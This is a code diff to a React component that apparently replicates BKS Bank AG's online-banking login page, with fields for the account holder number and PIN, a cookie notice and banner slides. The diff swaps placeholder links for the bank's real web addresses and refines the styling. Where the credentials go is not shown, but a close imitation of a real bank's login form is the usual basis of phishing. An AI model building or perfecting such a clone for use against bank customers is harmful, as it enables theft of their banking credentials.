@@ -37,21 +37,21 @@ const translations: Record<Lang, {
     firstLogin: "Erstanmeldung",
     linksTitle: "Weiterführende Links",
     links: [
-      { label: "BKS Security (Download)", href: "https://www.bks.at" },
-      { label: "FAQ - oft gestellte Fragen", href: "https://www.bks.at" },
-      { label: "Servicenummern", href: "https://www.bks.at" },
-      { label: "Sicherheitsinformation", href: "https://www.bks.at" },
-      { label: "Fernwartung (Wartungstool)", href: "https://www.bks.at" },
-      { label: "Wertpapierinformationen", href: "https://www.bks.at" },
+      { label: "BKS Security (Download)", href: "https://www.bks.at/services/internetbanking-und-apps/bks-security-app" },
+      { label: "FAQ - oft gestellte Fragen", href: "https://www.bks.at/services/internetbanking-und-apps/mynet" },
+      { label: "Servicenummern", href: "https://www.bks.at/hilfe" },
+      { label: "Sicherheitsinformation", href: "https://www.bks.at/footer/sicherheit" },
+      { label: "Fernwartung (Wartungstool)", href: "https://www.bks.at/services/fernwartung" },
+      { label: "Wertpapierinformationen", href: "https://www.bks.at/footer/wertpapierinformationen" },
     ],
     cookieText: "Wir verwenden auf dieser Seite nur funktionale Cookies sowie solche, die zur Erfüllung unserer gesetzlichen Pflichten erforderlich sind.",
     cookieMore: "Weitere Informationen",
     cookieClose: "Schließen",
     footerLinks: [
-      { label: "Impressum", href: "https://www.bks.at" },
-      { label: "AGB", href: "https://www.bks.at" },
-      { label: "Geschäftsbedingungen", href: "https://www.bks.at" },
-      { label: "Fernwartung", href: "https://www.bks.at" },
+      { label: "Impressum", href: "https://www.bks.at/footer/impressum" },
+      { label: "AGB", href: "https://www.bks.at/footer/agb-und-konditionen" },
+      { label: "Geschäftsbedingungen", href: "https://www.bks.at/documents/879862/0/Bedingungen_Internetbanking.pdf" },
+      { label: "Fernwartung", href: "javascript:void(0);" },
     ],
     languageNames: ["Deutsch", "Englisch"],
     copyright: "© 2026 BKS Bank AG",
@@ -65,21 +65,21 @@ const translations: Record<Lang, {
     firstLogin: "First login",
     linksTitle: "Further links",
     links: [
-      { label: "BKS Security (Download)", href: "https://www.bks.at" },
-      { label: "FAQ", href: "https://www.bks.at" },
-      { label: "Service numbers", href: "https://www.bks.at" },
-      { label: "Security information", href: "https://www.bks.at" },
-      { label: "Remote support tool", href: "https://www.bks.at" },
-      { label: "Securities information", href: "https://www.bks.at" },
+      { label: "BKS Security (Download)", href: "https://www.bks.at/services/internetbanking-und-apps/bks-security-app" },
+      { label: "FAQ", href: "https://www.bks.at/services/internetbanking-und-apps/mynet" },
+      { label: "Service numbers", href: "https://www.bks.at/hilfe" },
+      { label: "Security information", href: "https://www.bks.at/footer/sicherheit" },
+      { label: "Remote support tool", href: "https://www.bks.at/services/fernwartung" },
+      { label: "Securities information", href: "https://www.bks.at/footer/wertpapierinformationen" },
     ],
     cookieText: "We only use functional cookies and those required for legal compliance on this page.",
     cookieMore: "More information",
     cookieClose: "Close",
     footerLinks: [
-      { label: "Imprint", href: "https://www.bks.at" },
-      { label: "Terms", href: "https://www.bks.at" },
-      { label: "Conditions", href: "https://www.bks.at" },
-      { label: "Remote support", href: "https://www.bks.at" },
+      { label: "Imprint", href: "https://www.bks.at/footer/impressum" },
+      { label: "Terms", href: "https://www.bks.at/footer/agb-und-konditionen" },
+      { label: "Conditions", href: "https://www.bks.at/documents/879862/0/Bedingungen_Internetbanking.pdf" },
+      { label: "Remote support", href: "javascript:void(0);" },
     ],
     languageNames: ["German", "English"],
     copyright: "© 2026 BKS Bank AG",
@@ -88,6 +88,10 @@ const translations: Record<Lang, {
 
 const langKeys: Lang[] = ["DE", "EN"];
 const slides = [slide1, slide2];
+const slideLinks = [
+  "https://www.bks.at/privatkunden/anlegen/anlageprodukte/bks-anlagemix?utm_source=portal&utm_medium=banner&utm_campaign=bks-anlagemix",
+  "https://www.bks.at/privatkunden/anlegen/anlageprodukte/bks-bank-anleihen",
+];
 
 const PURPLE = "#422373";
 const PINK = "#e50051";
@@ -203,7 +207,7 @@ const Bks = () => {
             >
               <span style={{ flex: "1 1 auto" }}>
                 {t.cookieText}{" "}
-                <a href="https://www.bks.at" target="_blank" rel="noopener noreferrer" style={{ color: "#fff", fontWeight: 400 }}>
+                <a href="https://www.bks.at" target="_blank" rel="noopener noreferrer" style={{ color: "#fff", fontWeight: 700 }}>
                   {t.cookieMore}
                 </a>
               </span>
@@ -284,7 +288,7 @@ const Bks = () => {
                 overflow: "hidden",
               }}
             >
-              <div style={{ padding: "16px 20px 16px" }}>
+              <div style={{ padding: "14px 20px 8px" }}>
                 <h2 style={{ fontSize: 18, fontWeight: 700, margin: "0 0 28px", color: PINK }}>
                   {t.loginTitle}
                 </h2>
@@ -294,6 +298,8 @@ const Bks = () => {
                   placeholder={t.step1}
                   value={verfNr}
                   onChange={(e) => setVerfNr(e.target.value)}
+                  onFocus={(e) => (e.currentTarget.placeholder = "")}
+                  onBlur={(e) => (e.currentTarget.placeholder = t.step1)}
                   style={{ ...inputStyle, marginBottom: 12, height: 44, padding: "0 12px" }}
                 />
 
@@ -304,6 +310,8 @@ const Bks = () => {
                     placeholder={t.pinPlaceholder}
                     value={pin}
                     onChange={(e) => setPin(e.target.value)}
+                    onFocus={(e) => (e.currentTarget.placeholder = "")}
+                    onBlur={(e) => (e.currentTarget.placeholder = t.pinPlaceholder)}
                     style={{ ...inputStyle, flex: "1 1 0", width: 0, minWidth: 0, height: 44, padding: "0 12px" }}
                   />
                   <div ref={langRef} style={{ position: "relative", flex: "1 1 0", width: 0, minWidth: 0 }}>
@@ -362,7 +370,7 @@ const Bks = () => {
                   </div>
                 </div>
 
-                <p style={{ fontSize: 12, lineHeight: 1.5, margin: "0 0 16px", color: PURPLE }}>
+                <p style={{ fontSize: 12, lineHeight: 1.5, margin: "0 0 8px", color: PURPLE }}>
                   {t.sslText}
                 </p>
 
@@ -375,7 +383,7 @@ const Bks = () => {
                       background: PURPLE,
                       color: "#fff",
                       border: "none",
-                      padding: "8px 28px",
+                      padding: "12px 36px",
                       fontSize: 14,
                       fontWeight: 400,
                       cursor: "pointer",
@@ -480,22 +488,34 @@ const Bks = () => {
               }}
             >
               {slides.map((src, i) => (
-                <img
+                <a
                   key={i}
-                  src={src}
-                  alt={`Werbung ${i + 1}`}
+                  href={slideLinks[i]}
+                  target="_blank"
+                  rel="noopener noreferrer"
                   style={{
                     position: i === 0 ? "relative" : "absolute",
                     top: 0,
                     left: 0,
                     width: "100%",
                     height: "100%",
-                    objectFit: "cover",
+                    display: "block",
                     opacity: currentSlide === i ? 1 : 0,
                     transition: "opacity 0.6s ease",
-                    display: "block",
+                    pointerEvents: currentSlide === i ? "auto" : "none",
                   }}
-                />
+                >
+                  <img
+                    src={src}
+                    alt={`Werbung ${i + 1}`}
+                    style={{
+                      width: "100%",
+                      height: "100%",
+                      objectFit: "cover",
+                      display: "block",
+                    }}
+                  />
+                </a>
               ))}
               {/* Pagination row */}
               <div
